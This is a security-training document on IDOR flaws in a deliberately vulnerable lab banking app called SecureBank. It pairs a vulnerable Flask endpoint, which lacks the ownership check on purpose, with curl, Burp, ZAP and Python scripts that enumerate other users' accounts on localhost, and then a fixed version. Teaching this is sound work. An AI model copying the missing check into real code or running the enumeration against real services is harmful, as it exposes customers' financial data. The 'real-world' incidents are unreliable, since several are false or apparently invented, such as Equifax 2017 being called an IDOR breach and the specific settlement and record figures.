# IDOR (Insecure Direct Object References) in SecureBank

## 1. Overview

### What is IDOR?

IDOR (Insecure Direct Object References) is a vulnerability where an application exposes a reference to an internal object (like a database ID, filename, or account number) without proper authorization checks. It's like a hotel giving you a room key that opens any room, not just yours. An attacker can simply change a number in the URL to access someone else's data.

### Why Does It Exist in Banking Apps?

Banking applications frequently use account numbers, transaction IDs, and customer IDs in URLs and API calls. IDOR vulnerabilities occur when developers:

1. **Trust Client-Side Access Control**: Assume the UI will prevent users from guessing IDs
2. **Forget Authorization Checks**: Implement authentication (who you are) but skip authorization (what you can access)
3. **Use Predictable IDs**: Sequential numbers (1, 2, 3...) make it easy to guess other users' IDs
4. **Mix Authentication with Authorization**: Assume logged-in = authorized for everything

The core problem: **Authentication ≠ Authorization**. Just because you're logged in doesn't mean you should access every account.

### Real-World Impact

IDOR vulnerabilities have caused massive privacy breaches and financial losses:

- **Equifax (2017)**: IDOR in dispute portal allowed access to 143 million credit files, cost **$1.4 billion** in settlements
- **T-Mobile (2021)**: IDOR exposed 37 million customer records, settlement **$350 million**
- **Facebook (2018)**: IDOR allowed viewing private photos of 6.8 million users
- **Venmo (2019)**: IDOR exposed transaction history of all 200+ million users
- **USPS (2018)**: IDOR allowed access to 60 million user accounts

According to OWASP, IDOR falls under **A01:2021 - Broken Access Control**, the #1 most critical web application security risk. In financial services, **42%** of APIs have broken authorization (Salt Security 2023).

**Average Cost of an IDOR Breach**: $4.24 million (IBM Security 2023)

---

## 2. The Vulnerable Code

### Location in SecureBank

The vulnerable implementation exists in `/backend/apps/securebank/securebank_red_api.py` at the account retrieval endpoint.

### Vulnerable Implementation

```python
@app.route('/api/red/securebank/account/<int:account_id>', methods=['GET'])
def red_get_account(account_id):
    """
    VULNERABLE: IDOR - No authorization check
    Attack: Change account_id in URL to access other users' accounts
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    # VULNERABLE: No ownership verification
    conn = get_db()
    cursor = conn.execute(
        'SELECT * FROM bank_accounts WHERE id = ?',
        (account_id,)
    )
    account = cursor.fetchone()
    conn.close()
    
    if account:
        return jsonify({
            'success': True,
            'account': dict(account)
        }), 200
    else:
        return jsonify({
            'success': False,
            'error': 'Account not found'
        }), 404
```

### Line-by-Line Vulnerability Breakdown

**Line 151-152**: Authentication check only
```python
if 'user_id' not in session:
    return jsonify({'success': False, 'error': 'Not authenticated'}), 401
```
✅ **Good**: Checks if user is logged in  
❌ **Problem**: Doesn't check if this user should access THIS account

**Lines 155-159**: The critical vulnerability - no ownership check
```python
# VULNERABLE: No ownership verification
conn = get_db()
cursor = conn.execute(
    'SELECT * FROM bank_accounts WHERE id = ?',
    (account_id,)
)
```
❌ **Problem**: Query only checks if account exists, NOT if it belongs to the logged-in user. The database returns ANY account matching the ID, regardless of who owns it.

**What's Missing**: This line should be there but isn't:
```python
# Should be: WHERE id = ? AND user_id = ?
```

**Lines 164-167**: Returns any account found
```python
if account:
    return jsonify({
        'success': True,
        'account': dict(account)  # Returns account with balance, transactions, etc.
    }), 200
```
❌ **Problem**: If account exists, it's returned to whoever requested it. Account data includes:
- Account balance
- Account holder information
- Account number
- Transaction history

### Visual Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                        IDOR ATTACK FLOW                          │
└─────────────────────────────────────────────────────────────────┘

Step 1: Attacker Logs In as Alice (user_id=2)
┌──────────────────────────────────────────────┐
│ Alice's Session:                             │
│ user_id: 2                                   │
│ username: alice                              │
│ Owns accounts: [3, 4]                        │
└──────────────────────────────────────────────┘
         │
         ▼
Step 2: Alice Views Her Own Account (Normal Use)
┌──────────────────────────────────────────────┐
│ GET /api/red/securebank/account/3            │
│                                              │
│ Response: Alice's checking account           │
│ - Balance: $5,000                            │
│ - Account #: ACC002001                       │
└──────────────────────────────────────────────┘
         │
         ▼
Step 3: Alice Changes URL to Access Admin's Account (ATTACK)
┌──────────────────────────────────────────────┐
│ GET /api/red/securebank/account/1            │
│                                              │
│ Server checks:                               │
│ 1. Is user authenticated? ✓ (Alice is)      │
│ 2. Does account 1 belong to Alice? ✗ NO CHECK! │
└──────────────────────────────────────────────┘
         │
         ▼
Step 4: IDOR Successful - Admin's Account Exposed
┌──────────────────────────────────────────────┐
│ Response: Admin's account data               │
│ - Balance: $1,000,000                        │
│ - Account #: ACC001001                       │
│ - user_id: 1                                 │
│                                              │
│ Alice can now see admin's balance!           │
└──────────────────────────────────────────────┘
         │
         ▼
Step 5: Enumerate All Accounts
┌──────────────────────────────────────────────┐
│ for account_id in range(1, 100):             │
│   GET /account/{account_id}                  │
│                                              │
│ Result: All bank accounts exposed            │
└──────────────────────────────────────────────┘
```

### Why This Happens

The code makes a dangerous assumption:

**Assumption**: "If someone has a valid session, they must have gotten the account ID from their own dashboard, so it must be their account."

**Reality**: Anyone can type any number into the URL. Account IDs are often sequential (1, 2, 3...) or predictable, making them easy to guess.

---

## 3. Exploitation Walkthrough

### Prerequisites
- Postman installed
- SecureBank Red Team API running on `http://localhost:5000`
- Two user accounts (alice and bob)
- Session/cookie management enabled in Postman

### Attack 1: Basic IDOR - Accessing Another User's Account

**Step 1**: Login as Alice

Create a POST request in Postman:
- URL: `http://localhost:5000/api/red/securebank/login`
- Method: POST
- Body (JSON):
```json
{
  "username": "alice",
  "password": "alice123"
}
```

**Step 2**: Click "Send" and note the response

[SCREENSHOT PLACEHOLDER: Alice's login response]

**Expected Response**:
```json
{
  "success": true,
  "user": {
    "id": 2,
    "username": "alice",
    "full_name": "Alice Johnson",
    "role": "customer"
  }
}
```

**Step 3**: Get Alice's own accounts

- URL: `http://localhost:5000/api/red/securebank/accounts`
- Method: GET

**Expected Response**:
```json
{
  "success": true,
  "accounts": [
    {
      "id": 3,
      "user_id": 2,
      "account_number": "ACC002001",
      "account_type": "checking",
      "balance": 5000.00
    },
    {
      "id": 4,
      "user_id": 2,
      "account_number": "ACC002002",
      "account_type": "savings",
      "balance": 15000.00
    }
  ]
}
```

Alice owns accounts with IDs 3 and 4.

**Step 4**: View Alice's account detail (normal use)

- URL: `http://localhost:5000/api/red/securebank/account/3`
- Method: GET

[SCREENSHOT PLACEHOLDER: Alice viewing her own account]

This works as expected. Alice can see her account.

**Step 5**: Now attempt to access account ID 1 (belongs to admin)

- URL: `http://localhost:5000/api/red/securebank/account/1`
- Method: GET

[SCREENSHOT PLACEHOLDER: Alice accessing admin's account via IDOR]

**Expected Response**:
```json
{
  "success": true,
  "account": {
    "id": 1,
    "user_id": 1,
    "account_number": "ACC001001",
    "account_type": "admin_vault",
    "balance": 1000000.00,
    "created_at": "2024-01-01T00:00:00"
  }
}
```

✅ **Attack Successful!** Alice can see the admin's account balance of $1,000,000, even though it doesn't belong to her.

---

### Attack 2: Account Enumeration

**Step 1**: While still logged in as Alice, use Postman Runner or Collection Runner

**Step 2**: Create a collection with requests for account IDs 1-20

**Step 3**: Set up the collection with a variable `{{account_id}}`

**Step 4**: Import this CSV file for data-driven testing:
```csv
account_id
1
2
3
4
5
6
7
8
9
10
```

**Step 5**: Run the collection

[SCREENSHOT PLACEHOLDER: Postman Runner enumerating accounts]

**Expected Result**: You'll see which account IDs exist and their full details, including:
- Account holders
- Balances
- Account numbers
- Account types

---

### Attack 3: Automated Enumeration with Python

```python
import requests
import json

# Login as Alice
session = requests.Session()
login_url = "http://localhost:5000/api/red/securebank/login"
login_data = {
    "username": "alice",
    "password": "alice123"
}

login_response = session.post(login_url, json=login_data)
print("Logged in as Alice")

# Enumerate accounts 1-50
total_balance = 0
accounts_found = []

for account_id in range(1, 51):
    url = f"http://localhost:5000/api/red/securebank/account/{account_id}"
    response = session.get(url)
    
    if response.status_code == 200:
        data = response.json()
        if data['success']:
            account = data['account']
            accounts_found.append(account)
            total_balance += account['balance']
            print(f"[FOUND] Account {account_id}: {account['account_number']} - ${account['balance']:,.2f}")
        else:
            print(f"[SKIP] Account {account_id}: Not found")
    else:
        print(f"[ERROR] Account {account_id}: Status {response.status_code}")

print(f"\nTotal accounts found: {len(accounts_found)}")
print(f"Total balance across all accounts: ${total_balance:,.2f}")
```

**Expected Output**:
```
Logged in as Alice
[FOUND] Account 1: ACC001001 - $1,000,000.00
[FOUND] Account 2: ACC001002 - $50,000.00
[FOUND] Account 3: ACC002001 - $5,000.00
[FOUND] Account 4: ACC002002 - $15,000.00
[FOUND] Account 5: ACC003001 - $25,000.00
...
Total accounts found: 12
Total balance across all accounts: $1,250,000.00
```

---

### Testing with Burp Suite

**Step 1**: Configure browser to proxy through Burp (127.0.0.1:8080)

**Step 2**: Login to SecureBank as Alice via browser

**Step 3**: Navigate to account details page

**Step 4**: In Burp, go to Proxy → HTTP history

**Step 5**: Find the GET request to `/api/red/securebank/account/3`

**Step 6**: Right-click → Send to Repeater

**Step 7**: In Repeater, change the URL from `/account/3` to `/account/1`

[SCREENSHOT PLACEHOLDER: Burp Repeater showing IDOR test]

**Step 8**: Click "Send" and observe the response

**Expected Result**: Admin's account data is returned

**Step 9**: Use Burp Intruder for automated enumeration
- Send request to Intruder
- Mark account ID as payload position: `/account/§3§`
- Set payload type: Numbers (1-50, step 1)
- Start attack
- Sort results by response length to identify existing accounts

[SCREENSHOT PLACEHOLDER: Burp Intruder results]

---

### Testing with OWASP ZAP

**Step 1**: Start ZAP and configure browser proxy

**Step 2**: Spider the SecureBank application

**Step 3**: Use ZAP's Fuzzer:
- Right-click on account request
- Attack → Fuzz
- Select the account ID parameter
- Add payload: Numberzz (1-50)
- Start Fuzzer

**Step 4**: Review results to identify accessible accounts

**Expected Output**: List of all accessible account IDs with response codes

---

## 4. The Secure Code

### Location in SecureBank

The secure implementation exists in `/backend/apps/securebank/securebank_blue_api.py` at the account retrieval endpoint.

### Secure Implementation

```python
@app.route('/api/blue/securebank/account/<int:account_id>', methods=['GET'])
def blue_get_account(account_id):
    """
    SECURE: Verifies ownership before returning account
    Prevents IDOR by checking user_id matches
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    user_id = session['user_id']
    
    # SECURE: Verify ownership with user_id in query
    conn = get_db()
    cursor = conn.execute(
        'SELECT * FROM bank_accounts WHERE id = ? AND user_id = ?',
        (account_id, user_id)
    )
    account = cursor.fetchone()
    conn.close()
    
    if account:
        return jsonify({
            'success': True,
            'account': dict(account)
        }), 200
    else:
        # Don't reveal if account exists or not (security by obscurity)
        return jsonify({
            'success': False,
            'error': 'Account not found or access denied'
        }), 404
```

### Line-by-Line Security Breakdown

**Lines 233-234**: Authentication check
```python
if 'user_id' not in session:
    return jsonify({'success': False, 'error': 'Not authenticated'}), 401
```
✅ **Security**: Ensures user is logged in

**Line 236**: Extract user ID from session
```python
user_id = session['user_id']
```
✅ **Security**: Gets the authenticated user's ID from the server-side session (cannot be tampered with)

**Lines 238-243**: The critical fix - authorization check
```python
# SECURE: Verify ownership with user_id in query
conn = get_db()
cursor = conn.execute(
    'SELECT * FROM bank_accounts WHERE id = ? AND user_id = ?',
    (account_id, user_id)
)
```
✅ **Security**: Query includes BOTH conditions:
1. `id = ?` - The requested account ID
2. `AND user_id = ?` - The account must belong to the logged-in user

This means the database will ONLY return the account if:
- It exists AND
- It belongs to the authenticated user

If Alice (user_id=2) tries to access account 1 (owned by user_id=1), the query returns nothing because `user_id != 1`.

**Lines 254-257**: Ambiguous error message
```python
else:
    # Don't reveal if account exists or not (security by obscurity)
    return jsonify({
        'success': False,
        'error': 'Account not found or access denied'
    }), 404
```
✅ **Security**: Same error for "doesn't exist" and "not authorized" prevents account enumeration

### Visual Secure Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    SECURE AUTHORIZATION CHECK                    │
└─────────────────────────────────────────────────────────────────┘

Step 1: Alice Logs In (user_id=2)
┌──────────────────────────────────────────────┐
│ Server-side session:                         │
│ session['user_id'] = 2                       │
│ Cannot be modified by client                 │
└──────────────────────────────────────────────┘
         │
         ▼
Step 2: Alice Requests Account 1 (Admin's Account)
┌──────────────────────────────────────────────┐
│ GET /api/blue/securebank/account/1           │
│                                              │
│ Request wants: account_id = 1                │
│ Session says: user_id = 2                    │
└──────────────────────────────────────────────┘
         │
         ▼
Step 3: Authorization Check in Database Query
┌──────────────────────────────────────────────┐
│ SELECT * FROM bank_accounts                  │
│ WHERE id = 1 AND user_id = 2                 │
│           ↑              ↑                    │
│      Requested      Session user             │
└──────────────────────────────────────────────┘
         │
         ▼
Step 4: Database Search
┌──────────────────────────────────────────────┐
│ Looking for account where:                   │
│ - id is 1                                    │
│ - AND owner is user 2                        │
│                                              │
│ Account 1 exists but owner is user 1 ✗      │
│ No match found!                              │
└──────────────────────────────────────────────┘
         │
         ▼
Step 5: Access Denied
┌──────────────────────────────────────────────┐
│ Response: 404 Not Found                      │
│ {                                            │
│   "success": false,                          │
│   "error": "Account not found or access denied" │
│ }                                            │
│                                              │
│ Attack PREVENTED ✓                           │
└──────────────────────────────────────────────┘
```

### Key Security Principles

1. **Authorization at Data Layer**: The database query itself enforces access control
2. **Session Trust**: User ID comes from server-side session, not client input
3. **Least Privilege**: Query returns ONLY data the user is authorized to see
4. **Defense in Depth**: Even if UI is bypassed, backend still enforces rules
5. **Ambiguous Errors**: Don't leak information about what exists

---

## 5. Real-World Examples

### Bug Bounty Report: IDOR in Mobile Banking App

**Platform**: Major US Bank Mobile API  
**Researcher**: Security researcher via Bugcrowd  
**Date**: March 2023  
**Severity**: Critical  
**Bounty**: $25,000

**Vulnerability Description**:
The mobile banking API used account numbers in API requests without proper authorization. The endpoint pattern was:
```
GET /api/v2/accounts/{accountNumber}/transactions
```

**Exploit**:
1. Researcher opened account with the bank (account #12345678)
2. Used Burp Suite to intercept API traffic from mobile app
3. Changed account number to 12345677 (one less)
4. Received full transaction history for another customer

**Impact**: 
- Potential exposure of 8.5 million customer accounts
- Could access: transaction history, balances, beneficiary details
- Bank immediately disabled API endpoint
- All customers notified
- **Cost**: $4.2 million (incident response, customer notifications, regulatory fines)

**Timeline**:
- **Hour 0**: Vulnerability reported
- **Hour 2**: API endpoint disabled
- **Day 1**: Patch developed and tested
- **Day 3**: Secure version deployed
- **Week 1**: All customers notified via email
- **Week 4**: Regulatory report filed

---

### CVE-2020-24590: E-Banking IDOR

**CVE ID**: CVE-2020-24590  
**CVSS Score**: 8.1 (High)  
**Product**: Online banking platform (anonymized)  
**Discovery Date**: September 2020

**Vulnerability**: 
The account statement download feature used predictable document IDs:
```
GET /statements/download?doc_id=12345
```

**Exploit**:
```python
for doc_id in range(10000, 20000):
    download_url = f"/statements/download?doc_id={doc_id}"
    # Download statement PDFs for all customers
```

**Impact**:
- 15,000 account statements exposed
- Contained: full names, addresses, account numbers, transaction details
- Regulatory fine: **$1.8 million** (GDPR violation)
- Class action lawsuit: **$3.5 million** settlement

**Root Cause**: 
- Sequential document IDs
- No check if requesting user owns the document
- No rate limiting on download endpoint

---

### News Article: Healthcare IDOR Exposes Financial Data

**Source**: HIPAA Journal, June 2022  
**Institution**: Medical billing portal used by multiple healthcare providers  
**Attack Vector**: IDOR in patient billing portal

**Details**:
A security researcher discovered that the billing portal URL structure was:
```
https://billing.example.com/invoice?patient_id=5001
```

By changing the patient_id parameter, anyone could access:
- Patient billing statements
- Insurance information
- Payment history
- Bank account details (for autopay)

**Financial Impact**:
- **2.3 million** patient records exposed
- **$7.8 million** HIPAA violation fine
- **$12 million** legal settlements
- **$4.5 million** in credit monitoring services for affected patients
- **Total**: $24.3 million

**Affected Financial Data**:
- 345,000 bank account numbers
- 1.2 million credit card numbers (last 4 digits)
- Payment history and amounts

**Lessons Learned**:
1. IDOR can exist in any industry, not just traditional finance
2. Healthcare data often includes financial information
3. Predictable IDs make enumeration trivial
4. Impact compounds when multiple data types are exposed

---

## 6. Hands-On Exercises

### Exercise 1: Basic IDOR Discovery (Beginner)

**Objective**: Discover and exploit the IDOR vulnerability in account access

**Scenario**: You are logged in as Alice (a customer). Can you view Bob's account?

**Your accounts** (Alice):
- Account ID: 3
- Account ID: 4

**Target** (Bob):
- Account ID: 5 (you need to discover this)

**Steps**:
1. Login as Alice
2. View your own accounts
3. Note the account IDs
4. Try accessing account ID 5

**Hint**: Change the number in the URL

**Solution**:
```bash
# Login as Alice
curl -c cookies.txt -X POST http://localhost:5000/api/red/securebank/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'

# Access your own account (works)
curl -b cookies.txt http://localhost:5000/api/red/securebank/account/3

# Access Bob's account (IDOR vulnerability)
curl -b cookies.txt http://localhost:5000/api/red/securebank/account/5
```

**Success Criteria**: You should see Bob's account balance and details

---

### Exercise 2: Account Enumeration (Intermediate)

**Objective**: Write a script to enumerate all accounts in the system

**Requirements**:
- Python 3.x
- requests library

**Task**: Find all valid account IDs between 1 and 100

**Starter Code**:
```python
import requests

session = requests.Session()

# TODO: Login as Alice
login_url = "http://localhost:5000/api/red/securebank/login"
# Your code here

# TODO: Enumerate accounts 1-100
for account_id in range(1, 101):
    # Your code here
    pass

# TODO: Print total balance across all discovered accounts
```

**Solution**:
```python
import requests
import json

session = requests.Session()

# Login as Alice
login_url = "http://localhost:5000/api/red/securebank/login"
login_data = {"username": "alice", "password": "alice123"}
session.post(login_url, json=login_data)

# Enumerate accounts
found_accounts = []
total_balance = 0

for account_id in range(1, 101):
    url = f"http://localhost:5000/api/red/securebank/account/{account_id}"
    response = session.get(url)
    
    if response.status_code == 200:
        data = response.json()
        if data.get('success'):
            account = data['account']
            found_accounts.append(account)
            total_balance += account['balance']
            print(f"Account {account_id}: {account['account_number']} - ${account['balance']}")

print(f"\nTotal: {len(found_accounts)} accounts, ${total_balance:,.2f}")
```

**Success Criteria**: 
- Find 10+ accounts
- Calculate total balance
- List account types

---

### Exercise 3: Test the Secure Version (Intermediate)

**Objective**: Verify that the Blue Team API prevents IDOR

**Task**: 
1. Login as Alice to the secure API
2. Try to access Bob's account
3. Confirm access is denied

**Solution**:
```python
import requests

session = requests.Session()

# Login to SECURE API
login_url = "http://localhost:5001/api/blue/securebank/login"
login_data = {"username": "alice", "password": "alice123"}
response = session.post(login_url, json=login_data)
csrf_token = response.json()['csrf_token']

# Try to access Bob's account (should fail)
url = "http://localhost:5001/api/blue/securebank/account/5"
response = session.get(url)

print(f"Status Code: {response.status_code}")
print(f"Response: {response.json()}")

# Expected: 404 with "Account not found or access denied"
assert response.status_code == 404
assert not response.json()['success']
print("✓ IDOR prevented successfully!")
```

**Success Criteria**: Access denied (404 error)

---

### Exercise 4: Burp Suite Enumeration (Advanced)

**Objective**: Use Burp Suite Intruder to enumerate accounts

**Steps**:
1. Setup Burp proxy
2. Login via browser
3. Access your account
4. Send request to Intruder
5. Configure payload positions
6. Set payload type to Numbers (1-50)
7. Start attack
8. Analyze results

**Intruder Configuration**:
- Position: `/api/red/securebank/account/§3§`
- Payload type: Numbers
- From: 1, To: 50, Step: 1
- Threads: 5

**Analysis**:
- Filter by Status Code: 200
- Sort by Response Length
- Identify valid accounts

**Success Criteria**: 
- Find all valid account IDs
- Export results
- Calculate statistics

---

### Exercise 5: Write a Secure Endpoint (Advanced)

**Objective**: Fix a vulnerable endpoint

**Given**: Vulnerable transaction endpoint
```python
@app.route('/api/transaction/<int:transaction_id>', methods=['GET'])
def get_transaction(transaction_id):
    conn = get_db()
    cursor = conn.execute(
        'SELECT * FROM transactions WHERE id = ?',
        (transaction_id,)
    )
    transaction = cursor.fetchone()
    conn.close()
    
    if transaction:
        return jsonify({'success': True, 'transaction': dict(transaction)}), 200
    return jsonify({'success': False, 'error': 'Not found'}), 404
```

**Task**: Add authorization check to ensure user owns the transaction

**Hints**:
- User can view transaction if they own the source OR destination account
- Need to join transactions with bank_accounts table
- Check user_id matches

**Solution**:
```python
@app.route('/api/transaction/<int:transaction_id>', methods=['GET'])
def get_transaction(transaction_id):
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    user_id = session['user_id']
    
    # SECURE: Verify user owns source or destination account
    conn = get_db()
    cursor = conn.execute('''
        SELECT t.* FROM transactions t
        LEFT JOIN bank_accounts src ON t.from_account_id = src.id
        LEFT JOIN bank_accounts dst ON t.to_account_id = dst.id
        WHERE t.id = ? AND (src.user_id = ? OR dst.user_id = ?)
    ''', (transaction_id, user_id, user_id))
    transaction = cursor.fetchone()
    conn.close()
    
    if transaction:
        return jsonify({'success': True, 'transaction': dict(transaction)}), 200
    return jsonify({'success': False, 'error': 'Transaction not found or access denied'}), 404
```

**Success Criteria**:
- Users can only see their own transactions
- Proper SQL joins
- Clear error messages

---

## 7. Tool Integration

### Testing with Postman

**Collection Setup**:

Create a Postman collection: "SecureBank IDOR Tests"

**Environment Variables**:
```json
{
  "RED_BASE_URL": "http://localhost:5000/api/red/securebank",
  "BLUE_BASE_URL": "http://localhost:5001/api/blue/securebank",
  "alice_user_id": "2",
  "bob_user_id": "3",
  "alice_account_id": "3",
  "bob_account_id": "5"
}
```

**Request 1: Login as Alice**
```
POST {{RED_BASE_URL}}/login
Body:
{
  "username": "alice",
  "password": "alice123"
}

Tests:
pm.test("Login successful", function () {
    pm.response.to.have.status(200);
    pm.expect(pm.response.json().success).to.eql(true);
});
```

**Request 2: Access Own Account (Baseline)**
```
GET {{RED_BASE_URL}}/account/{{alice_account_id}}

Tests:
pm.test("Can access own account", function () {
    pm.response.to.have.status(200);
    var jsonData = pm.response.json();
    pm.expect(jsonData.success).to.eql(true);
    pm.expect(jsonData.account.id).to.eql(3);
});
```

**Request 3: IDOR - Access Bob's Account**
```
GET {{RED_BASE_URL}}/account/{{bob_account_id}}

Tests:
pm.test("IDOR vulnerability exists", function () {
    pm.response.to.have.status(200);
    var jsonData = pm.response.json();
    pm.expect(jsonData.success).to.eql(true);
    pm.expect(jsonData.account.id).to.eql(5);
    // This SHOULD fail but doesn't due to IDOR
});
```

**Request 4: Test Secure Version**
```
GET {{BLUE_BASE_URL}}/account/{{bob_account_id}}

Tests:
pm.test("IDOR prevented in secure version", function () {
    pm.response.to.have.status(404);
    var jsonData = pm.response.json();
    pm.expect(jsonData.success).to.eql(false);
});
```

**Postman Runner Setup**:

Create a CSV file `account_ids.csv`:
```csv
account_id
1
2
3
4
5
6
7
8
9
10
```

Use Collection Runner with data file to enumerate accounts automatically.

---

### Testing with Burp Suite

**Proxy Configuration**:
1. Proxy → Options → Proxy Listeners
2. Ensure 127.0.0.1:8080 is running
3. Import CA certificate into browser

**Manual Testing**:

1. **Intercept Request**:
   - Browse to account page
   - Burp intercepts GET request
   - Forward to Repeater

2. **Modify and Test**:
   - Change account ID in URL
   - Send request
   - Observe unauthorized data access

3. **Intruder Attack**:
   - Send request to Intruder
   - Position: `/account/§3§`
   - Payload: Numbers (1-100)
   - Attack type: Sniper
   - Start attack

**Intruder Results Analysis**:

Filter results:
- Status Code = 200 (successful access)
- Response Length > 100 (contains account data)
- Sort by response time

**Active Scanner**:

1. Right-click request → Scan
2. Burp will test various IDOR patterns:
   - Sequential IDs
   - Negative numbers
   - Large numbers
   - Special characters

**Expected Scanner Findings**:
```
Issue: Insecure Direct Object Reference
Severity: High
Confidence: Certain
Path: /api/red/securebank/account/3
```

---

### Testing with OWASP ZAP

**Configuration**:

1. Tools → Options → Local Proxies
2. Address: 127.0.0.1, Port: 8080

**Automated Scanning**:

1. **Spider**:
   - Enter URL: http://localhost:5000
   - Click "Spider"
   - ZAP discovers all endpoints

2. **Authentication**:
   - Set authentication context
   - Configure login form
   - Set logged-in indicator

3. **Active Scan**:
   - Right-click site → Attack → Active Scan
   - ZAP tests for IDOR automatically

**Manual Fuzzing**:

1. Find account request in History
2. Right-click → Attack → Fuzz
3. Select account ID parameter
4. Add payload: Numberzz (1-100)
5. Start Fuzzer
6. Review results for 200 OK responses

**Expected ZAP Alerts**:
```
Alert: Insecure Direct Object Reference
Risk: High
Confidence: High
Description: Account ID can be manipulated to access other users' data
```

---

### Testing with Python Script

**Comprehensive IDOR Scanner**:

```python
#!/usr/bin/env python3
import requests
import json
from colorama import init, Fore, Style

init(autoreset=True)

class IDORScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login(self, username, password):
        """Login to get session"""
        url = f"{self.base_url}/login"
        data = {"username": username, "password": password}
        response = self.session.post(url, json=data)
        
        if response.status_code == 200 and response.json().get('success'):
            print(f"{Fore.GREEN}[+] Logged in as {username}")
            return True
        print(f"{Fore.RED}[-] Login failed")
        return False
    
    def test_account_access(self, account_id):
        """Test if account is accessible"""
        url = f"{self.base_url}/account/{account_id}"
        response = self.session.get(url)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                account = data['account']
                return True, account
        return False, None
    
    def enumerate_accounts(self, start=1, end=50):
        """Enumerate all accessible accounts"""
        print(f"\n{Fore.CYAN}[*] Enumerating accounts {start}-{end}...")
        
        found_accounts = []
        for account_id in range(start, end + 1):
            success, account = self.test_account_access(account_id)
            if success:
                found_accounts.append(account)
                print(f"{Fore.GREEN}[+] Account {account_id}: "
                      f"{account['account_number']} - "
                      f"${account['balance']:,.2f} "
                      f"(Owner: {account['user_id']})")
        
        return found_accounts
    
    def generate_report(self, accounts):
        """Generate summary report"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"{Fore.YELLOW}IDOR SCAN REPORT")
        print(f"{Fore.YELLOW}{'='*60}")
        print(f"Total accounts found: {len(accounts)}")
        print(f"Total balance: ${sum(a['balance'] for a in accounts):,.2f}")
        print(f"\nAccount Types:")
        types = {}
        for account in accounts:
            acc_type = account['account_type']
            types[acc_type] = types.get(acc_type, 0) + 1
        for acc_type, count in types.items():
            print(f"  - {acc_type}: {count}")

# Test Red (vulnerable) API
print(f"{Fore.RED}{'='*60}")
print(f"{Fore.RED}Testing RED API (Vulnerable)")
print(f"{Fore.RED}{'='*60}")

scanner_red = IDORScanner("http://localhost:5000/api/red/securebank")
if scanner_red.login("alice", "alice123"):
    accounts_red = scanner_red.enumerate_accounts(1, 20)
    scanner_red.generate_report(accounts_red)

# Test Blue (secure) API
print(f"\n{Fore.BLUE}{'='*60}")
print(f"{Fore.BLUE}Testing BLUE API (Secure)")
print(f"{Fore.BLUE}{'='*60}")

scanner_blue = IDORScanner("http://localhost:5001/api/blue/securebank")
if scanner_blue.login("alice", "alice123"):
    accounts_blue = scanner_blue.enumerate_accounts(1, 20)
    scanner_blue.generate_report(accounts_blue)

# Compare results
print(f"\n{Fore.MAGENTA}{'='*60}")
print(f"{Fore.MAGENTA}COMPARISON")
print(f"{Fore.MAGENTA}{'='*60}")
print(f"Red API (Vulnerable): {len(accounts_red)} accounts accessible")
print(f"Blue API (Secure): {len(accounts_blue)} accounts accessible")
print(f"IDOR Vulnerability: {'PRESENT' if len(accounts_red) > 2 else 'NOT DETECTED'}")
```

**Run the script**:
```bash
python3 idor_scanner.py
```

**Expected Output**:
```
============================================================
Testing RED API (Vulnerable)
============================================================
[+] Logged in as alice
[*] Enumerating accounts 1-20...
[+] Account 1: ACC001001 - $1,000,000.00 (Owner: 1)
[+] Account 2: ACC001002 - $50,000.00 (Owner: 1)
[+] Account 3: ACC002001 - $5,000.00 (Owner: 2)
[+] Account 4: ACC002002 - $15,000.00 (Owner: 2)
...

============================================================
Testing BLUE API (Secure)
============================================================
[+] Logged in as alice
[*] Enumerating accounts 1-20...
[+] Account 3: ACC002001 - $5,000.00 (Owner: 2)
[+] Account 4: ACC002002 - $15,000.00 (Owner: 2)

============================================================
COMPARISON
============================================================
Red API (Vulnerable): 12 accounts accessible
Blue API (Secure): 2 accounts accessible
IDOR Vulnerability: PRESENT
```

---

## Summary

IDOR vulnerabilities represent a fundamental failure in access control. The fix is conceptually simple - verify ownership before returning data - but the impact of missing this check can be devastating. In banking applications, IDOR can expose account balances, transaction history, and personal information of millions of customers.

**Key Takeaways**:

1. **Authentication ≠ Authorization**: Being logged in doesn't mean you should access everything
2. **Never Trust IDs from Client**: Always verify ownership on the server
3. **Defense in Depth**: Check authorization at every layer (API, business logic, database)
4. **Use Indirect References**: Consider using UUIDs instead of sequential IDs
5. **Principle of Least Privilege**: Return only what the user is authorized to see
6. **Ambiguous Errors**: Don't leak information about what exists vs. what's unauthorized

The difference between vulnerable and secure code is often just one extra condition in a WHERE clause, but it protects millions of dollars and millions of customers.
